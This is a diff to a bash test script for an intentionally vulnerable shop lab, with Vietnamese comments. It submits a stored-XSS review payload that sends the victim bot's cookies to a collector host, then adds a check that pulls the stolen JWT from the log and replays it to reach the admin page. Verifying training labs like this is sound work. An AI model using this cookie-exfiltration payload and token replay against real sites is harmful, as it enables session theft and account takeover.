@@ -85,13 +85,21 @@ if [[ "${WITH_BOT:-0}" == "1" ]]; then
   GW=$(docker network inspect owasp-shop-lab_lab_17_edge --format '{{(index .IPAM.Config 0).Gateway}}' 2>/dev/null || echo 172.18.0.1)
   curl -s -o /dev/null -X POST "$B/product/1/review" -H "Cookie: token=$ATOK" \
     --data-urlencode 'rating=5' \
-    --data-urlencode "text=<script>new Image().src=\"http://${GW}:${PORT}/c14?c=\"+encodeURIComponent(document.cookie)</script>"
+    --data-urlencode "text=<script>new Image().src=\"http://${GW}:${PORT}/c14?who=smoketest&cookie=\"+encodeURIComponent(document.cookie)</script>"
   sleep "$BOT_WAIT"
   kill $SRV 2>/dev/null
   if grep -q 'moderation_key' "$LOG"; then
     echo "PASS  C14-exfil (bot gửi cookie chứa moderation_key về collector)"; PASS=$((PASS+1))
   else
     echo "FAIL  C14-exfil (bot chưa exfil — kiểm tra bot có mạng edge & payload)"; FAIL=$((FAIL+1)); FAILED+=("C14-exfil")
+  fi
+  # Session hijacking: rút token bị đánh cắp khỏi log rồi replay
+  # (encodeURIComponent giữ nguyên dấu '.' của JWT)
+  STOKEN=$(grep -oP 'token%3D[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$LOG" | head -1 | sed 's/^token%3D//')
+  if [[ -n "$STOKEN" ]] && curl -s -H "Cookie: token=$STOKEN" "$B/admin/reviews" | grep -q 'Mod Bot\|moderation'; then
+    echo "PASS  C14-hijack (replay token đánh cắp → đăng nhập được với tư cách Mod Bot)"; PASS=$((PASS+1))
+  else
+    echo "FAIL  C14-hijack (token đánh cắp không replay được)"; FAIL=$((FAIL+1)); FAILED+=("C14-hijack")
   fi
   rm -f "$LOG"
 fi
